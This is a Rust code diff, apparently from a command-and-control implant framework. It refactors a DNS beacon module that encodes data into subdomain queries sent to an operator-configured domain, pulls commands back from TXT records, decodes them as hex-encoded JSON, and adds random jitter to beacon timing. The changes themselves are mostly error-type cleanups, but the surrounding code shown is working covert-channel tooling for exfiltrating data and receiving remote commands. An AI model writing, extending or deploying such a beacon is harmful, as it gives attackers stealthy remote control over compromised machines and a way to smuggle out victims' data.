@@ -1,5 +1,6 @@
 use std::time::Duration;
 use hickory_resolver::proto::rr::RData;
+use rand::RngExt;
 
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
 pub struct DnsBeaconConfig {
@@ -54,12 +55,12 @@ impl DnsBeacon {
 
     fn jitter_delay(&self) -> Duration {
         let base = self.config.interval_secs as f64;
-        let jitter = base * self.config.jitter_pct * rand::random::<f64>();
+        let jitter = base * self.config.jitter_pct * rand::rng().random::<f64>();
         let total = base + jitter - (self.config.jitter_pct * base / 2.0);
         Duration::from_secs_f64(total.max(1.0))
     }
 
-    pub async fn send_data(&self, data: &str) -> Result<DnsCommand, String> {
+    pub async fn send_data(&self, data: &str) -> Result<DnsCommand, crate::C2Error> {
         let encoded = self.encode_data(data);
         let query = format!("{}.{}", encoded, self.config.domain);
 
@@ -78,12 +79,12 @@ impl DnsBeacon {
                                 }
                             }
                         }
-                        Err("No valid TXT records found".to_string())
+                        Err(crate::C2Error::Transport("No valid TXT records found".to_string()))
                     }
-                    Err(e) => Err(format!("DNS lookup failed: {}", e)),
+                    Err(e) => Err(crate::C2Error::Transport(format!("DNS lookup failed: {}", e))),
                 }
             }
-            None => Err("DNS resolver not initialized".to_string()),
+            None => Err(crate::C2Error::Transport("DNS resolver not initialized".to_string())),
         }
     }
 
@@ -97,11 +98,12 @@ impl DnsBeacon {
             .join(".")
     }
 
-    fn decode_response(&self, txt: &str) -> Result<DnsCommand, String> {
+    fn decode_response(&self, txt: &str) -> Result<DnsCommand, crate::C2Error> {
         let trimmed = txt.trim_matches('"');
-        let bytes = hex::decode(trimmed).map_err(|e| format!("hex decode failed: {}", e))?;
+        let bytes = hex::decode(trimmed)
+            .map_err(|e| crate::C2Error::Protocol(format!("hex decode failed: {}", e)))?;
         serde_json::from_slice::<DnsCommand>(&bytes)
-            .map_err(|e| format!("json decode failed: {}", e))
+            .map_err(|e| crate::C2Error::Protocol(format!("json decode failed: {}", e)))
     }
 
     pub async fn beacon_loop(&self, mut cancel: tokio::sync::watch::Receiver<bool>) {
